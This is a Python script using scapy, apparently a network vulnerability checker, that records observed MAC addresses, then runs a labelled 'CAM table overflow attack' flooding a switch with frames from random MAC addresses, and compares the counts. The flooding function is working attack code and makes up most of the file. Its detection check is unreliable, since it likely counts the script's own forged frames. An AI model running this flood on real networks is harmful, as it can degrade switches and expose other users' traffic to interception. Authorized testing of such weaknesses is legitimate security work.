from scapy.all import sniff, sendp, Ether
import random

initial_mac_addresses = set()
final_mac_addresses = set()

def generate_random_mac():
    """Generate a random MAC address."""
    return "02:00:00:%02x:%02x:%02x" % (
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
    )

def packet_callback(packet, mac_set):
    if packet.haslayer(Ether):

        mac_set.add(packet[Ether].src)

def capture_mac_addresses(interface, duration, mac_set):
    print(f"Capturing MAC addresses on {interface} for {duration} seconds...")
    sniff(iface=interface, prn=lambda pkt: packet_callback(pkt, mac_set), timeout=duration)
    print("Capture complete.")

def cam_table_overflow(interface, num_frames=200):
    """Perform a CAM table overflow attack by sending packets with random MAC addresses."""
    print(f"Sending {num_frames} frames with random MAC addresses...")
    for _ in range(num_frames):
        random_mac = generate_random_mac()
        packet = Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff")
        sendp(packet, iface=interface, verbose=False)
    print("Frames sent.")

def monitor_for_cam_table_overflow(interface, threshold=200, initial_duration=10):

    print("Initial MAC address collection phase...")
    capture_mac_addresses(interface, initial_duration, initial_mac_addresses)
    initial_mac_count = len(initial_mac_addresses)
    print(f"Initial number of unique MAC addresses: {initial_mac_count}")


    cam_table_overflow(interface)


    print("\nCapturing MAC addresses after the attack...")
    capture_mac_addresses(interface, initial_duration, final_mac_addresses)
    final_mac_count = len(final_mac_addresses) 
    print(f"Number of unique MAC addresses after CAM table overflow: {final_mac_count}")


    mac_difference = final_mac_count - initial_mac_count
    print(f"Difference in unique MAC addresses: {mac_difference}")


    if mac_difference >= threshold:
        print("CAM table overflow detected! The network is likely vulnerable.")
    else:
        print("No significant CAM table overflow detected. The network may not be vulnerable.")

if __name__ == "__main__":
    interface = "eth0"  # Replace with your network interface
    monitor_for_cam_table_overflow(interface)

